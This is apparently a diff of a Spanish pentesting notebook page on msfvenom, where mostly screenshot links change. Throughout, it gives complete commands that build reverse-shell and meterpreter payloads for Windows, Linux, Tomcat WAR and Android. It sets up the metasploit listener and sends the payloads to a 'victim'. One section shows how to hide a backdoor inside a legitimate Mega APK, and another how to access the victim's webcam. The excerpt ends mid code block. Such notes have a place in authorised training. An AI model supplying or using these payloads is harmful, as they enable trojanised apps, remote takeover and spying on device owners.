@@ -24,16 +24,22 @@ Podemos también generar un payload para entablar una reverse shell en forma de 
 ```python
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.20 LPORT=443 -f exe -o pwned.exe
 ```
-![[Pasted image 20230817140645.png]]
+
+![[Pasted image 20240613011409.png]]
+
 Una vez generado esto, tenemos que abrir el /multi/handler de metasploit seleccionando como payload el meterpreter:
 ```bash
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 ```
-![[Pasted image 20230817140542.png]]
+
+![[Pasted image 20240613011416.png]]
+
 Y ahora desde la máquina víctima, ejecutamos el script creado anteriormente:
-![[Pasted image 20230817140608.png]]
+![[Pasted image 20240613011426.png]]
+
 Y recibimos sesión de meterpreter:
-![[Pasted image 20230817140625.png]]
+![[Pasted image 20240613011432.png]]
+
 Aunque también podemos crear un payload que no sea de meterpreter, sino para recibir una shell normal, haciéndolo de la misma forma:
 ```python
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
@@ -44,30 +50,40 @@ Los ficheros elf en linux se pueden asemejar a los exe de windows, por lo que ha
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=443 -f elf -o pwned.elf
 ```
-![[Pasted image 20230818120343.png]]
+
+![[Pasted image 20240613011441.png]]
+
 Lo compartimos con la máquina víctima:
-![[Pasted image 20230818120411.png]]
+![[Pasted image 20240613011444.png]]
+
 Nos ponemos en la escucha con metasploit usando el payload de meterpreter para linux:
 ```bash
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
 ```
-![[Pasted image 20230818120441.png]]
+
+![[Pasted image 20240613011448.png]]
+
 Ejecutamos el archivo en la máquina víctima y recibimos la conexión:
-![[Pasted image 20230818120513.png]]
+![[Pasted image 20240613011455.png]]
 
 ## Fichero WAR malicioso con msfvenom para hacking tomcat
 
 Estamos ante un servidor tomcat, que por ejemplo se trata de la máquina [[MAQUINA DEPLOY]], donde dentro del puerto 8080 corre un servidor tomcat y se nos muestra que podemos subir un archivo WAR:
-![[Pasted image 20240101185536.png]]
+
+![[Pasted image 20240613011504.png]]
+
 ```bash
 msfvenom -p java/shell_reverse_tcp LHOST=192.168.0.37 LPORT=443 -f war -o revshell.war
 ```
+
 Lo creamos
-![[Pasted image 20240101190014.png]]
+![[Pasted image 20240613011517.png]]
+
 Lo subimos y lo tenemos aquí dentro del servidor, donde hacemos clic:
-![[Pasted image 20240101190609.png]]
+![[Pasted image 20240613011526.png]]
+
 Y recibimos la conexión:
-![[Pasted image 20240101190633.png]]
+![[Pasted image 20240613011532.png]]
 
 -----------------------------------------
 
@@ -78,41 +94,55 @@ Podemos también crear un payload dentro de un apk y establecer una sesión de m
 ```bash
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=443 > virus.apk
 ```
-![[Pasted image 20230913095619.png]]
+
+![[Pasted image 20240613011542.png]]
 Y ahora con metasploit estaremos en la escucha con el multi handler, además de establecer el payload correcto:
 ```bash
 set payload android/meterpreter/reverse_tcp
 ```
-![[Pasted image 20230913095744.png]]
+
+![[Pasted image 20240613011547.png]]
 Si la ejecutamos desde un dispositivo android habremos recibido una sesión de meterpreter:
-![[Pasted image 20230913100126.png]]
+
+![[Pasted image 20240613011605.png]]
+
 Y podemos acceder a la webcam:
-![[Pasted image 20230913100232.png]]
+![[Pasted image 20240613011611.png]]
 
 # ESCONDER BACKDOOR EN APK LEGÍTIMA
 Primero tenemos que instalar apktool en nuestro kali:
-![[Pasted image 20230915153411.png]]
+![[Pasted image 20240613011617.png]]
+
 Y también nos bajamos la última versión del apktool:
-![[Pasted image 20230915153511.png]]
+![[Pasted image 20240613011621.png]]
+
 Otorgamos permisos a los 2 archivos:
-![[Pasted image 20230915153651.png]]
+![[Pasted image 20240613011625.png]]
+
 Movemos los dos archivos al siguiente directorio:
-![[Pasted image 20230915154214.png]]
+![[Pasted image 20240613011629.png]]
+
 Y dentro del /usr/local/bin tenemos que renombrar el fichero .jar de esta forma:
-![[Pasted image 20230915153900.png]]
+![[Pasted image 20240613011634.png]]
+
 Y ahora si ejecutamos el apktool debería funcionar bien:
-![[Pasted image 20230915154546.png]]
+![[Pasted image 20240613011641.png]]
+
 Y ahora instalaremos estos 3 paquetes:
-![[Pasted image 20230915160559.png]]
+![[Pasted image 20240613011646.png]]
+
 Ahora el siguiente paso será descargar un apk legítima, por ejemplo la de mega:
-![[Pasted image 20230915124544.png]]
+![[Pasted image 20240613011650.png]]
+
 Y ahora una vez descargado el apk lo pasamos por msfvenom:
 ```bash
 msfvenom -x mega.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.36 LPORT=443 -o mega_virus.apk
 ```
-![[Pasted image 20230915155153.png]]
+
+![[Pasted image 20240613011657.png]]
+
 Lo pasamos al dispositivo android y ahora con metasploit nos ponemos en la escucha:
-![[Pasted image 20230915155351.png]]
+![[Pasted image 20240613011703.png]]
 
 Nos compartimos el apk con la víctima y con metasploit nos ponemos en la escucha, poniendo este payload:
 ```bash
